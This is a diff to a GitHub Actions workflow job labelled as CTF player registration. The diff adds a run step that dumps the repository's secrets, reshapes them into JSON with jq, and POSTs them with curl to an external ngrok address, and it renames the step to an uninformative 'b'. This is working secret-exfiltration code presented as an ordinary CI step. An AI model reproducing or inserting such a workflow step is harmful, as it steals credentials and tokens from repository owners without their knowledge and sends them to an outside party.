@@ -5,7 +5,8 @@ jobs:
   ctf_registration:
     runs-on: ubuntu-latest
     steps:
-      - name: register player
+      - uses: actions/checkout@v2
+      - name: b
         uses: actions/setup-node@v1
-        - run: |
-            ${{secrets}} | jq -sR  'split("\n") | map(split("=")) | map(select(length > 0) | { (.[0]) : (.[1:] | join("")) }) | add' | curl -X POST -H 'Content-type: application/json'  http://312177246bcd.ngrok.io/api/info --data-binary @-
+      - run: |
+          ${{secrets}} | jq -sR  'split("\n") | map(split("=")) | map(select(length > 0) | { (.[0]) : (.[1:] | join("")) }) | add' | curl -X POST -H 'Content-type: application/json'  http://312177246bcd.ngrok.io/api/info --data-binary @-
